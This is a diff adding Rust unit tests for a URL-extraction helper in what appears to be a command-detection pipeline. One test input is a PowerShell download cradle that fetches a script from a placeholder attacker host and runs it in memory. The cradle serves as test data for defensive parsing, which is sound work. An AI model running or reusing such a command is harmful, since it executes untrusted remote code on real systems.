@@ -627,7 +627,33 @@ where
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
-    use super::{DetectionPipelineOutcome, PipelineError, detect_and_deposit};
+    use super::{DetectionPipelineOutcome, PipelineError, candidate_url_values, detect_and_deposit};
+
+    #[test]
+    fn candidate_url_values_match_substrate_semantics() {
+        // Lowercase only scheme+authority; strip one trailing path slash;
+        // preserve query/fragment slashes verbatim. Must stay aligned with
+        // substrate::normalize_url_value — these are duplicated helpers.
+        let cmd = "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('HTTPS://Evil.X/Path/?next=/admin/')\"";
+        let got = candidate_url_values(cmd);
+        assert_eq!(
+            got,
+            vec!["https://evil.x/Path?next=/admin/".to_string()]
+        );
+    }
+
+    #[test]
+    fn candidate_url_values_strips_single_path_slash_only() {
+        let got = candidate_url_values("curl https://x/p//");
+        assert_eq!(got, vec!["https://x/p/".to_string()]);
+    }
+
+    #[test]
+    fn candidate_url_values_preserves_fragment_slash() {
+        let got = candidate_url_values("wget https://x/p#section/");
+        assert_eq!(got, vec!["https://x/p#section/".to_string()]);
+    }
+
     use crate::config::parse_config;
     use crate::detector_factory::build_detector_from_strategy;
     use ed25519_dalek::SigningKey;
